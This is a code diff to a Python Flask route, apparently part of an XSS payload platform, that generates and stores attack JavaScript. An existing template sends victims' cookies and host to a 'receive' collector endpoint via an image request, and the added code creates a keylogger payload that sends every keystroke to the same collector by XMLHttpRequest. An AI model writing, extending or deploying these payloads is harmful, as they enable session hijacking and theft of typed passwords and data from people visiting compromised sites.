@@ -70,6 +70,8 @@ def js_create():
         jm_name = func.encrypt_to_hex(name)
 
         host = request.url_root
+
+
         if len == "0":
             js_template = 'var img=document.createElement("img");\n' \
                           'img.src="{http_host}receive?h="+escape(document.location.host)+"&m="+escape(document.cookie)+"&u={user}"+"&n={jm_name}";\n' \
@@ -93,6 +95,36 @@ def js_create():
             finally:
                 connection.close()
         if len == "1":
+            username = session.get('user')
+            js_template = f"""document.onkeypress = function(evt) {{
+    evt = evt || window.event;
+    key = String.fromCharCode(evt.charCode);
+    if(key) {{
+        var http = new XMLHttpRequest();
+        var param = encodeURI(key);
+        var getData = "{host}receive?h=" + escape(document.location.host) + "&m=" + param + "&u={username}" + "&n={jm_name}";
+        http.open("GET", getData, true);
+        http.send();
+    }}
+}}"""
+            js_content = js_template
+
+            now = datetime.now()
+            time_data = now.strftime("%Y-%m-%d %H:%M:%S")
+            connection = pymysql.connect(**config.init.DB_CONFIG)
+            try:
+                with connection.cursor() as cursor:
+                    insert_xss_sql = "INSERT INTO g_js (name, username, js_code, time_data, jm_name) VALUES (%s, %s, %s, %s, %s)"
+                    cursor.execute(insert_xss_sql, (name, username, js_content, time_data, jm_name))
+                    connection.commit()
+            except Exception as e:
+                connection.rollback()
+                raise e
+            finally:
+                connection.close()
+
+
+        if len == "2":
             js_content = description
             username = session.get('user')
 
